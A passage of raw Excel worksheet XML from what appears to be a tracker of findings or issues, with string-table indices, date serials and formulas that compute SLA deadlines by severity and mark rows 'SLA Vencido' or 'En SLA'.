      <c r="B424" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C424" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D424" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G424" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="I424" t="s">
        <v>1659</v>
      </c>
      <c r="J424" t="s">
        <v>1271</v>
      </c>
      <c r="L424" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M424" t="s">
        <v>111</v>
      </c>
      <c r="N424" t="s">
        <v>1614</v>
      </c>
      <c r="Q424" t="s">
        <v>1621</v>
      </c>
      <c r="T424" s="1">
        <v>45839</v>
      </c>
      <c r="U424" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V424" s="1">
        <f t="shared" si="21"/>
        <v>45959</v>
      </c>
      <c r="W424" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB424" s="65" t="s">
        <v>1655</v>
      </c>
      <c r="AC424" s="65" t="s">
        <v>1656</v>
      </c>
      <c r="AD424" s="65" t="s">
        <v>1657</v>
      </c>
      <c r="AE424" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG424" s="68" t="s">
        <v>1092</v>
      </c>
    </row>
    <row r="425" spans="1:33" ht="188.5" x14ac:dyDescent="0.35">
      <c r="A425" s="5">
        <v>424</v>
      </c>
      <c r="B425" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C425" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D425" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G425" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="I425" t="s">
        <v>1660</v>
      </c>
      <c r="J425" t="s">
        <v>1271</v>
      </c>
      <c r="L425" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M425" t="s">
        <v>111</v>
      </c>
      <c r="N425" t="s">
        <v>1614</v>
      </c>
      <c r="Q425" t="s">
        <v>1590</v>
      </c>
      <c r="T425" s="1">
        <v>45839</v>
      </c>
      <c r="U425" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V425" s="1">
        <f t="shared" si="21"/>
        <v>45959</v>
      </c>
      <c r="W425" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB425" s="65" t="s">
        <v>1655</v>
      </c>
      <c r="AC425" s="65" t="s">
        <v>1656</v>
      </c>
      <c r="AD425" s="65" t="s">
        <v>1657</v>
      </c>
      <c r="AE425" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG425" s="68" t="s">
        <v>1092</v>
      </c>
    </row>
    <row r="426" spans="1:33" ht="188.5" x14ac:dyDescent="0.35">
      <c r="A426" s="5">
        <v>425</v>
      </c>
      <c r="B426" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C426" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D426" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G426" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="I426" t="s">
        <v>1661</v>
      </c>
      <c r="J426" t="s">
        <v>1271</v>
      </c>
      <c r="L426" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M426" t="s">
        <v>111</v>
      </c>
      <c r="N426" t="s">
        <v>1614</v>
      </c>
      <c r="Q426" t="s">
        <v>1593</v>
      </c>
      <c r="T426" s="1">
        <v>45839</v>
      </c>
      <c r="U426" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V426" s="1">
        <f t="shared" si="21"/>
        <v>45959</v>
      </c>
      <c r="W426" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB426" s="65" t="s">
        <v>1655</v>
      </c>
      <c r="AC426" s="65" t="s">
        <v>1656</v>
      </c>
      <c r="AD426" s="65" t="s">
        <v>1657</v>
      </c>
      <c r="AE426" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG426" s="68" t="s">
        <v>1092</v>
      </c>
    </row>
    <row r="427" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A427" s="5">
        <v>426</v>
      </c>
      <c r="B427" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C427" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D427" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G427" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="I427" t="s">
        <v>1662</v>
      </c>
      <c r="J427" t="s">
        <v>1663</v>
      </c>
      <c r="L427" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M427" t="s">
        <v>111</v>
      </c>
      <c r="N427">
        <v>3</v>
      </c>
      <c r="Q427" t="s">
        <v>1664</v>
      </c>
      <c r="T427" s="1">
        <v>45839</v>
      </c>
      <c r="U427" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V427" s="1">
        <f t="shared" si="21"/>
        <v>45959</v>
      </c>
      <c r="W427" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB427" s="65" t="s">
        <v>1665</v>
      </c>
      <c r="AC427" s="65" t="s">
        <v>1666</v>
      </c>
      <c r="AD427" s="65" t="s">
        <v>1667</v>
      </c>
      <c r="AE427" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG427" s="68" t="s">
        <v>1092</v>
      </c>
    </row>
    <row r="428" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A428" s="5">
        <v>427</v>
      </c>
      <c r="B428" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C428" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D428" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G428" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="I428" t="s">
        <v>1668</v>
      </c>
      <c r="J428" t="s">
        <v>1663</v>
      </c>
      <c r="L428" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M428" t="s">
        <v>111</v>
      </c>
      <c r="N428">
        <v>3</v>
      </c>
      <c r="Q428" t="s">
        <v>1581</v>
      </c>
      <c r="T428" s="1">
        <v>45839</v>
      </c>
      <c r="U428" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V428" s="1">
        <f t="shared" si="21"/>
        <v>45959</v>
      </c>
      <c r="W428" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB428" s="65" t="s">
        <v>1665</v>
      </c>
      <c r="AC428" s="65" t="s">
        <v>1666</v>
      </c>
      <c r="AD428" s="65" t="s">
        <v>1667</v>
      </c>
      <c r="AE428" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG428" s="68" t="s">
        <v>1092</v>
      </c>
    </row>
    <row r="429" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A429" s="5">
        <v>428</v>
      </c>
      <c r="B429" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C429" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D429" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G429" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="I429" t="s">
        <v>1669</v>
      </c>
      <c r="J429" t="s">
        <v>1663</v>
      </c>
      <c r="L429" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M429" t="s">
        <v>111</v>
      </c>
      <c r="N429">
        <v>3</v>
      </c>
      <c r="Q429" t="s">
        <v>1587</v>
      </c>
      <c r="T429" s="1">
        <v>45839</v>
      </c>
      <c r="U429" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V429" s="1">
        <f t="shared" si="21"/>
        <v>45959</v>
      </c>
      <c r="W429" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB429" s="65" t="s">
        <v>1665</v>
      </c>
      <c r="AC429" s="65" t="s">
        <v>1666</v>
      </c>
      <c r="AD429" s="65" t="s">
        <v>1667</v>
      </c>
      <c r="AE429" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG429" s="68" t="s">
        <v>1092</v>
      </c>
    </row>
    <row r="430" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A430" s="5">
        <v>429</v>
      </c>
      <c r="B430" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C430" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D430" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G430" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="I430" t="s">
        <v>1670</v>
      </c>
      <c r="J430" t="s">
        <v>1663</v>
      </c>
      <c r="L430" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M430" t="s">
        <v>111</v>
      </c>
      <c r="N430">
        <v>3</v>
      </c>
      <c r="Q430" t="s">
        <v>1621</v>
      </c>
      <c r="T430" s="1">
        <v>45839</v>
      </c>
      <c r="U430" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V430" s="1">
        <f t="shared" si="21"/>
        <v>45959</v>
      </c>
      <c r="W430" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB430" s="65" t="s">
        <v>1665</v>
      </c>
      <c r="AC430" s="65" t="s">
        <v>1666</v>
      </c>
      <c r="AD430" s="65" t="s">
        <v>1667</v>
      </c>
      <c r="AE430" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG430" s="68" t="s">
        <v>1092</v>
      </c>
    </row>
    <row r="431" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A431" s="5">
        <v>430</v>
      </c>
      <c r="B431" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C431" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D431" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G431" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="I431" t="s">
        <v>1671</v>
      </c>
      <c r="J431" t="s">
        <v>1663</v>
      </c>
      <c r="L431" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M431" t="s">
        <v>111</v>
      </c>
      <c r="N431">
        <v>3</v>
      </c>
      <c r="Q431" t="s">
        <v>1590</v>
      </c>
      <c r="T431" s="1">
        <v>45839</v>
      </c>
      <c r="U431" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V431" s="1">
        <f t="shared" si="21"/>
        <v>45959</v>
      </c>
      <c r="W431" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB431" s="65" t="s">
        <v>1665</v>
      </c>
      <c r="AC431" s="65" t="s">
        <v>1666</v>
      </c>
      <c r="AD431" s="65" t="s">
        <v>1667</v>
      </c>
      <c r="AE431" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG431" s="68" t="s">
        <v>1092</v>
      </c>
    </row>
    <row r="432" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A432" s="5">
        <v>431</v>
      </c>
      <c r="B432" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C432" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D432" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G432" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="I432" t="s">
        <v>1672</v>
      </c>
      <c r="J432" t="s">
        <v>1663</v>
      </c>
      <c r="L432" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M432" t="s">
        <v>111</v>
      </c>
      <c r="N432">
        <v>3</v>
      </c>
      <c r="Q432" t="s">
        <v>1593</v>
      </c>
      <c r="T432" s="1">
        <v>45839</v>
      </c>
      <c r="U432" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V432" s="1">
        <f t="shared" si="21"/>
        <v>45959</v>
      </c>
      <c r="W432" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB432" s="65" t="s">
        <v>1665</v>
      </c>
      <c r="AC432" s="65" t="s">
        <v>1666</v>
      </c>
      <c r="AD432" s="65" t="s">
        <v>1667</v>
      </c>
      <c r="AE432" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG432" s="68" t="s">
        <v>1092</v>
      </c>
    </row>
    <row r="433" spans="1:33" ht="304.5" x14ac:dyDescent="0.35">
      <c r="A433" s="5">
        <v>432</v>
      </c>
      <c r="B433" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C433" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D433" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G433" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="I433" t="s">
        <v>1673</v>
      </c>
      <c r="J433" t="s">
        <v>1674</v>
      </c>
      <c r="L433" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M433" t="s">
        <v>111</v>
      </c>
      <c r="N433" t="s">
        <v>1675</v>
      </c>
      <c r="Q433" t="s">
        <v>1587</v>
      </c>
      <c r="T433" s="1">
        <v>45839</v>
      </c>
      <c r="U433" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V433" s="1">
        <f t="shared" si="21"/>
        <v>45959</v>
      </c>
      <c r="W433" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB433" s="73" t="s">
        <v>1676</v>
      </c>
      <c r="AC433" s="73" t="s">
        <v>1677</v>
      </c>
      <c r="AD433" s="73" t="s">
        <v>1678</v>
      </c>
      <c r="AE433" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG433" s="68" t="s">
        <v>1092</v>
      </c>
    </row>
    <row r="434" spans="1:33" ht="304.5" x14ac:dyDescent="0.35">
      <c r="A434" s="5">
        <v>433</v>
      </c>
      <c r="B434" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C434" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D434" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G434" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="I434" t="s">
        <v>1679</v>
      </c>
      <c r="J434" t="s">
        <v>1674</v>
      </c>
      <c r="L434" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M434" t="s">
        <v>111</v>
      </c>
      <c r="N434" t="s">
        <v>1675</v>
      </c>
      <c r="Q434" t="s">
        <v>1590</v>
      </c>
      <c r="T434" s="1">
        <v>45839</v>
      </c>
      <c r="U434" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V434" s="1">
        <f t="shared" si="21"/>
        <v>45959</v>
      </c>
      <c r="W434" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB434" s="73" t="s">
        <v>1676</v>
      </c>
      <c r="AC434" s="73" t="s">
        <v>1677</v>
      </c>
      <c r="AD434" s="73" t="s">
        <v>1678</v>
      </c>
      <c r="AE434" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG434" s="68" t="s">
        <v>1092</v>
      </c>
    </row>
    <row r="435" spans="1:33" ht="304.5" x14ac:dyDescent="0.35">
      <c r="A435" s="5">
        <v>434</v>
      </c>
      <c r="B435" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C435" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D435" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G435" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="I435" t="s">
        <v>1680</v>
      </c>
      <c r="J435" t="s">
        <v>1674</v>
      </c>
      <c r="L435" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M435" t="s">
        <v>111</v>
      </c>
      <c r="N435" t="s">
        <v>1675</v>
      </c>
      <c r="Q435" t="s">
        <v>1593</v>
      </c>
      <c r="T435" s="1">
        <v>45839</v>
      </c>
      <c r="U435" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>370</v>
      </c>
      <c r="V435" s="1">
        <f t="shared" si="21"/>
        <v>45959</v>
      </c>
      <c r="W435" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB435" s="73" t="s">
        <v>1676</v>
      </c>
      <c r="AC435" s="73" t="s">
        <v>1677</v>
      </c>
      <c r="AD435" s="73" t="s">
        <v>1678</v>
      </c>
      <c r="AE435" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG435" s="68" t="s">
        <v>1092</v>
      </c>
    </row>
    <row r="436" spans="1:33" ht="409.5" x14ac:dyDescent="0.35">
      <c r="A436" s="5">
        <v>435</v>
      </c>
      <c r="B436" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C436" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D436" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G436" s="6" t="s">
        <v>1302</v>
      </c>
      <c r="H436" t="s">
        <v>1681</v>
      </c>
      <c r="I436" t="s">
        <v>1682</v>
      </c>
      <c r="J436" t="s">
        <v>1683</v>
      </c>
      <c r="L436" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M436" t="s">
        <v>61</v>
      </c>
      <c r="N436" t="s">
        <v>1684</v>
      </c>
      <c r="Q436" t="s">
        <v>1685</v>
      </c>
      <c r="T436" s="1">
        <v>45841</v>
      </c>
      <c r="U436" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>368</v>
      </c>
      <c r="V436" s="1">
        <f t="shared" si="21"/>
        <v>45931</v>
      </c>
      <c r="W436" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB436" s="65" t="s">
        <v>1686</v>
      </c>
      <c r="AC436" s="65" t="s">
        <v>1687</v>
      </c>
      <c r="AD436" s="73" t="s">
        <v>1688</v>
      </c>
      <c r="AE436" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG436" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="437" spans="1:33" ht="391.5" x14ac:dyDescent="0.35">
      <c r="A437" s="5">
        <v>436</v>
      </c>
      <c r="B437" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C437" s="63" t="s">
        <v>33</v>
      </c>
      <c r="D437" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G437" s="6" t="s">
        <v>1302</v>
      </c>
      <c r="H437" t="s">
        <v>1689</v>
      </c>
      <c r="I437" t="s">
        <v>1690</v>
      </c>
      <c r="J437" t="s">
        <v>1691</v>
      </c>
      <c r="L437" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M437" t="s">
        <v>61</v>
      </c>
      <c r="N437" t="s">
        <v>1684</v>
      </c>
      <c r="Q437" t="s">
        <v>1685</v>
      </c>
      <c r="T437" s="1">
        <v>45841</v>
      </c>
      <c r="U437" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>368</v>
      </c>
      <c r="V437" s="1">
        <f t="shared" si="21"/>
        <v>45931</v>
      </c>
      <c r="W437" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB437" s="65" t="s">
        <v>1692</v>
      </c>
      <c r="AC437" s="65" t="s">
        <v>1693</v>
      </c>
      <c r="AD437" s="65" t="s">
        <v>1694</v>
      </c>
      <c r="AE437" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG437" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="438" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A438" s="5">
        <v>437</v>
      </c>
      <c r="B438" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C438" s="63" t="s">
        <v>33</v>
      </c>
      <c r="D438" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G438" s="6" t="s">
        <v>1302</v>
      </c>
      <c r="H438" t="s">
        <v>1695</v>
      </c>
      <c r="I438" t="s">
        <v>1696</v>
      </c>
      <c r="J438" t="s">
        <v>1697</v>
      </c>
      <c r="L438" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M438" t="s">
        <v>61</v>
      </c>
      <c r="N438" t="s">
        <v>1684</v>
      </c>
      <c r="Q438" t="s">
        <v>1685</v>
      </c>
      <c r="T438" s="1">
        <v>45841</v>
      </c>
      <c r="U438" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>368</v>
      </c>
      <c r="V438" s="1">
        <f t="shared" si="21"/>
        <v>45931</v>
      </c>
      <c r="W438" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB438" s="65" t="s">
        <v>1698</v>
      </c>
      <c r="AC438" s="65" t="s">
        <v>1699</v>
      </c>
      <c r="AD438" s="65" t="s">
        <v>1700</v>
      </c>
      <c r="AE438" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG438" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="439" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A439" s="5">
        <v>438</v>
      </c>
      <c r="B439" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C439" s="63" t="s">
        <v>33</v>
      </c>
      <c r="D439" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G439" s="6" t="s">
        <v>1302</v>
      </c>
      <c r="I439" t="s">
        <v>1701</v>
      </c>
      <c r="J439" t="s">
        <v>1702</v>
      </c>
      <c r="L439" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M439" t="s">
        <v>111</v>
      </c>
      <c r="N439" t="s">
        <v>1703</v>
      </c>
      <c r="Q439" t="s">
        <v>1685</v>
      </c>
      <c r="T439" s="1">
        <v>45841</v>
      </c>
      <c r="U439" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>368</v>
      </c>
      <c r="V439" s="1">
        <f t="shared" si="21"/>
        <v>45961</v>
      </c>
      <c r="W439" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB439" s="65" t="s">
        <v>1704</v>
      </c>
      <c r="AC439" s="65" t="s">
        <v>1705</v>
      </c>
      <c r="AD439" s="65" t="s">
        <v>1706</v>
      </c>
      <c r="AE439" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG439" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="440" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A440" s="5">
        <v>439</v>
      </c>
      <c r="B440" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C440" s="63" t="s">
        <v>33</v>
      </c>
      <c r="D440" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G440" s="60" t="s">
        <v>445</v>
      </c>
      <c r="H440" t="s">
        <v>1707</v>
      </c>
      <c r="I440" t="s">
        <v>1708</v>
      </c>
      <c r="J440" s="65" t="s">
        <v>1709</v>
      </c>
      <c r="L440" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M440" t="s">
        <v>61</v>
      </c>
      <c r="N440" t="s">
        <v>1710</v>
      </c>
      <c r="Q440" t="s">
        <v>1711</v>
      </c>
      <c r="T440" s="1">
        <v>45845</v>
      </c>
      <c r="U440" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>364</v>
      </c>
      <c r="V440" s="1">
        <f t="shared" si="21"/>
        <v>45935</v>
      </c>
      <c r="W440" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB440" s="65" t="s">
        <v>1712</v>
      </c>
      <c r="AC440" s="65" t="s">
        <v>1713</v>
      </c>
      <c r="AD440" s="65" t="s">
        <v>1714</v>
      </c>
      <c r="AE440" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG440" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="441" spans="1:33" ht="188.5" x14ac:dyDescent="0.35">
      <c r="A441" s="5">
        <v>440</v>
      </c>
      <c r="B441" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C441" s="63" t="s">
        <v>33</v>
      </c>
      <c r="D441" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G441" s="60" t="s">
        <v>445</v>
      </c>
      <c r="I441" t="s">
        <v>1715</v>
      </c>
      <c r="J441" s="65" t="s">
        <v>1716</v>
      </c>
      <c r="L441" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M441" t="s">
        <v>111</v>
      </c>
      <c r="N441" t="s">
        <v>1614</v>
      </c>
      <c r="T441" s="1">
        <v>45845</v>
      </c>
      <c r="U441" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>364</v>
      </c>
      <c r="V441" s="1">
        <f t="shared" si="21"/>
        <v>45965</v>
      </c>
      <c r="W441" s="56" t="str">
        <f t="shared" ca="1" si="22"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB441" s="65" t="s">
        <v>1717</v>
      </c>
      <c r="AC441" s="65" t="s">
        <v>1718</v>
      </c>
      <c r="AD441" s="65" t="s">
        <v>1719</v>
      </c>
      <c r="AE441" s="51">
        <v>46080</v>
      </c>
      <c r="AG441" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="442" spans="1:33" ht="261" x14ac:dyDescent="0.35">
      <c r="A442" s="5">
        <v>441</v>
      </c>
      <c r="B442" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C442" s="63" t="s">
        <v>33</v>
      </c>
      <c r="D442" s="63" t="s">
        <v>34</v>
      </c>
      <c r="G442" s="60" t="s">
        <v>445</v>
      </c>
      <c r="I442" t="s">
        <v>1720</v>
      </c>
      <c r="J442" t="s">
        <v>1186</v>
      </c>
      <c r="L442" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M442" t="s">
        <v>111</v>
      </c>
      <c r="N442" t="s">
        <v>1675</v>
      </c>
      <c r="T442" s="1">
        <v>45845</v>
      </c>
      <c r="U442" s="67">
        <f t="shared" ca="1" si="18"/>
        <v>364</v>
      </c>
      <c r="V442" s="1">
        <f t="shared" ref="V442:V473" si="23">IF(M442="Critical",T442+10,IF(M442="High",T442+30,IF(M442="Bad",T442+30,IF(M442="Medium",T442+90,IF(M442="Warm",T442+90,IF(M442="Low",T442+120,IF(M442="Fair",T442+120,IF(M442="Neutral",T442+120,""))))))))</f>
        <v>45965</v>
      </c>
      <c r="W442" s="56" t="str">
        <f t="shared" ref="W442:W473" ca="1" si="24">IF(M442="Critical",IF(U442&gt;10,"SLA Vencido","En SLA"),IF(M442="High",IF(U442&gt;30,"SLA Vencido","En SLA"),IF(M442="Bad",IF(U442&gt;30,"SLA Vencido","En SLA"),IF(M442="Medium",IF(U442&gt;90,"SLA Vencido","En SLA"),IF(M442="Warm",IF(U442&gt;90,"SLA Vencido","En SLA"),IF(M442="Low",IF(U442&gt;120,"SLA Vencido","En SLA"),IF(M442="Fair",IF(U442&gt;120,"SLA Vencido","En SLA"),IF(M442="Neutral",IF(U442&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="AB442" s="65" t="s">
        <v>1721</v>
      </c>
      <c r="AC442" s="65" t="s">
        <v>1722</v>
      </c>
      <c r="AD442" s="65" t="s">
        <v>1189</v>
      </c>
      <c r="AE442" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG442" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="443" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A443" s="5">
        <v>442</v>
      </c>
      <c r="B443" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C443" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D443" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G443" s="54" t="s">
        <v>1723</v>
      </c>
      <c r="H443" t="s">
        <v>1724</v>
      </c>
      <c r="J443" t="s">
        <v>556</v>
      </c>
      <c r="L443" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M443" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N443" s="63" t="s">
        <v>1514</v>
      </c>
      <c r="Q443" t="s">
        <v>1725</v>
      </c>
      <c r="T443" s="1">
        <v>45779</v>
      </c>
      <c r="U443" s="55">
        <f t="shared" ca="1" si="18"/>
        <v>430</v>
      </c>
      <c r="V443" s="1">
        <f t="shared" si="23"/>
        <v>45869</v>
      </c>
      <c r="W443" s="56" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB443" t="s">
        <v>1726</v>
      </c>
      <c r="AC443" t="s">
        <v>1727</v>
      </c>
      <c r="AE443" s="51" t="s">
        <v>147</v>
      </c>
      <c r="AG443" s="27" t="s">
        <v>747</v>
      </c>
    </row>
    <row r="444" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A444" s="5">
        <v>443</v>
      </c>
      <c r="B444" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C444" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D444" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G444" s="54" t="s">
        <v>1723</v>
      </c>
      <c r="H444" t="s">
        <v>1728</v>
      </c>
      <c r="J444" t="s">
        <v>556</v>
      </c>
      <c r="L444" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M444" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N444" s="63" t="s">
        <v>1514</v>
      </c>
      <c r="Q444" t="s">
        <v>1725</v>
      </c>
      <c r="T444" s="1">
        <v>45779</v>
      </c>
      <c r="U444" s="55">
        <f t="shared" ca="1" si="18"/>
        <v>430</v>
      </c>
      <c r="V444" s="1">
        <f t="shared" si="23"/>
        <v>45869</v>
      </c>
      <c r="W444" s="56" t="str">
        <f t="shared" ca="1" si="24"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB444" t="s">
        <v>1726</v>
      </c>
      <c r="AC444" t="s">
        <v>1727</v>
